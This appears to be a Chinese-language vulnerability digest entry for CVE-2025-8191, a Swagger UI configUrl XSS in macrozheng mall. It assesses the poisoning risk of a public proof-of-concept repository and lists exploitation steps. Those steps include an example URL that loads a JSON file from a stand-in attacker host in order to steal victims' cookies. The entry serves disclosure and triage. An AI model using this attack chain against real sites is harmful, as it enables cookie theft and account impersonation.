## CVE-2025-8191-macrozheng mall-XSS

**漏洞编号:** CVE-2025-8191

**漏洞类型:** XSS

**影响应用:** macrozheng mall

**危害等级:** 中危，可能导致Cookie窃取和任意代码执行

**影响版本:** <= 1.0.3

**利用条件:** 需要目标服务器开启Swagger UI并可访问，用户访问包含恶意configUrl的Swagger UI页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-8191是一个存在于macrozheng mall 1.0.3版本及其之前版本的Swagger UI中的XSS漏洞。攻击者可以通过操纵/swagger-ui/index.html的configUrl参数来注入恶意JavaScript代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的存在和利用方法已被公开。提供的PoC代码尝试利用configUrl参数，创建一个包含恶意JavaScript的JSON文件(xss.json)，然后通过Swagger UI加载该文件，从而触发XSS。

**投毒风险：**
PoC代码本身主要功能是生成包含XSS Payload的JSON文件，并发起请求。其中存在一定投毒风险的地方在于：
1.  **依赖项：** 使用了 `curl` 库。理论上可以通过修改URL，将受害者curl请求，指定到恶意的服务器上，存在信息泄露或者中间人攻击的风险，此概率较低。
2.  **`exitAssembly()` 函数：** 这是一个内联汇编函数，用于退出程序。虽然目的是为了在出错时退出，但理论上如果该函数被恶意修改，可以执行一些其他指令。但结合代码上下文，该风险较低。

综合判断，认为该仓库存在投毒代码的可能性较低，大约10%。

**利用方式：**
1.  攻击者需要找到目标macrozheng mall实例并确认Swagger UI已启用。
2.  攻击者使用PoC代码生成一个包含恶意JavaScript的`xss.json`文件，该文件包含一段JavaScript代码，用于窃取Cookie并将它们发送到攻击者的服务器。
3.  攻击者构造一个包含恶意`configUrl`参数的URL，指向攻击者服务器上的`xss.json`文件。例如：`http://target/swagger-ui/index.html?configUrl=http://attacker/xss.json`
4.  攻击者诱骗受害者访问该URL。受害者访问后，恶意JavaScript代码将在受害者的浏览器中执行，窃取Cookie并发送给攻击者。
5.  攻击者可以使用窃取的Cookie冒充受害者，执行未经授权的操作。

**项目地址:** [byteReaper77/CVE-2025-8191](https://github.com/byteReaper77/CVE-2025-8191)

**漏洞详情:** [CVE-2025-8191](https://nvd.nist.gov/vuln/detail/CVE-2025-8191)